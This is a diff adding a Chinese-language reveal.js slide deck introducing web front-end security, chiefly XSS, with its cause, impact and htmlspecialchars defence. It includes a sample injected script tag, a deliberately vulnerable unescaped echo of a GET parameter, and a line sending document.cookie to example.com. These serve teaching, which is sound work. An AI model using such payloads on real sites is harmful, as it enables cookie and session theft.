@@ -1,0 +1,161 @@
+<!doctype html>
+<html lang="zh-CN">
+
+  <head>
+    <meta charset="utf-8">
+
+    <title>浅谈 Web 前端安全</title>
+
+    <meta name="description" content="web 前端安全">
+    <meta name="author" content="张林">
+
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+
+    <link rel="stylesheet" href="../vendor/reveal.js/css/reveal.min.css">
+    <link rel="stylesheet" href="../vendor/reveal.js/css/theme/default.css" id="theme">
+
+    <!-- For syntax highlighting -->
+    <link rel="stylesheet" href="../vendor/reveal.js/lib/css/zenburn.css">
+
+    <!-- If the query includes 'print-pdf', use the PDF print sheet -->
+    <script>
+      document.write( '<link rel="stylesheet" href="../vendor/reveal.js/css/print/' + ( window.location.search.match( /print-pdf/gi ) ? 'pdf' : 'paper' ) + '.css" type="text/css" media="print">' );
+    </script>
+
+<style>
+.floatInSlow,
+.floatInFast{
+  position:relative;
+  left:200%;
+}
+.floatInSlow{
+	-webkit-transition: all 2s ease!important;
+	   -moz-transition: all 2s ease!important;
+	    -ms-transition: all 2s ease!important;
+	     -o-transition: all 2s ease!important;
+	        transition: all 2s ease!important;
+}
+.floatInSlow.visible,
+.floatInFast.visible{
+  left:0;
+}
+
+
+.alignLeft{
+  text-align:left;
+}
+
+</style>
+
+    <!--[if lt IE 9]>
+    <script src="../vendor/reveal.js/lib/js/html5shiv.js"></script>
+    <![endif]-->
+    <base target="_blank" />
+  </head>
+
+  <body>
+
+    <div class="reveal">
+
+      <!-- Any section element inside of this container is displayed as a slide -->
+      <div class="slides">
+        <section>
+          <h1>浅谈 Web 前端安全</h1>
+          <p>
+            <small>by 林谦 @ 2012年12月27日</small>
+          </p>
+        </section>
+
+        <section>
+          <h2>目录</h2>
+          <ul>
+            <li>XSS</li>
+            <li>CSRF</li>
+            <li>其他</li>
+          </ul>
+        </section>
+
+        <section>
+
+          <section>
+            <h2>XSS</h2>
+            <ul>
+              <li>Cross-site scripting </li>
+              <li>原理: 
+              <p class="fragment">利用网页漏洞, 向网页里注入恶意 js, 用户浏览时执行恶意脚本</p>
+              </li>
+            </ul>
+          </section>
+
+          <section>
+            <h2>XSS</h2>
+            <p><a href="http://tms.taobao.com/go/chn/code/test.php" target="_blank">看个栗子</a></p>
+            <h4 class="fragment">原因</h4>
+            <ul class="fragment">
+              <li>原样输出了来自用户的内容</li>
+              <li><pre style="resize:both"><code class="php" contenteditable>echo $_GET['tweet'];</code></pre></li>
+              <li>用户的内容:<pre style="resize:both"><code class="php" contenteditable>&lt;script src="http://demo.ued.taobao.net/linqian/tmp/xss-demo.js"&gt;&lt;/script&gt;</code></pre></li>
+            </ul>
+            <p class="fragment">真实例子: 新浪微博 xss <a href="http://coolshell.cn/articles/4914.html" target="_blank">漏洞</a></p>
+          </section>
+
+          <section>
+            <h2>XSS</h2>
+            <h4>危害: </h4>
+            <ul>
+              <li>恶意代码作用域为被攻击页面</li>
+              <li>获取用户 cookie, 然后收集起来</li>
+              <li><pre style="resize:both"><code class="javascript" contenteditable>(new Image()).src="http://example.com?secret=" + encodeURIComponent(document.cookie);</code></pre></li>
+            </ul>
+          </section>
+
+          <section>
+            <h2>XSS</h2>
+            <h4>如何防范: </h4>
+            <ul>
+              <li>意识: 所有来自用户的数据都是不可信的</li>
+              <li>转义来自用户的数据: <span class="fragment">get, post, cookie</span></li>
+              <li>用户内容中的 html 标签一定要转义为<a href="http://www.w3school.com.cn/html/html_entities.asp" target="_blank">实体字符</a></li>
+              <li><pre style="resize:both"><code class="php" contenteditable>echo htmlspecialchars($_GET['tweet']);</code></pre></li>
+            </ul>
+          </section>
+
+        </section>
+
+      </div>
+
+    </div>
+
+    <script src="../vendor/reveal.js/lib/js/head.min.js"></script>
+    <script src="../vendor/reveal.js/js/reveal.min.js"></script>
+
+    <script>
+
+      // Full list of configuration options available here:
+      // https://github.com/hakimel/reveal.js#configuration
+      Reveal.initialize({
+        controls: true,
+        progress: true,
+        history: true,
+        center: true,
+
+        theme: Reveal.getQueryHash().theme, // available themes are in /css/theme
+        transition: Reveal.getQueryHash().transition || 'cube', // default/cube/page/concave/zoom/linear/none
+
+        // Optional libraries used to extend on reveal.js
+        dependencies: [
+          // { src: '../vendor/reveal.js/lib/js/classList.js', condition: function() { return !document.body.classList; } },
+          // { src: '../vendor/reveal.js/plugin/markdown/showdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+          // { src: '../vendor/reveal.js/plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+          { src: '../vendor/reveal.js/plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
+          // { src: '../vendor/reveal.js/plugin/zoom-js/zoom.js', async: true, condition: function() { return !!document.body.classList; } },
+          // { src: '../vendor/reveal.js/plugin/notes/notes.js', async: true, condition: function() { return !!document.body.classList; } },
+          // { src: 'plugin/remotes/remotes.js', async: true, condition: function() { return !!document.body.classList; } }
+        ]
+      });
+
+    </script>
+
+  </body>
+</html>
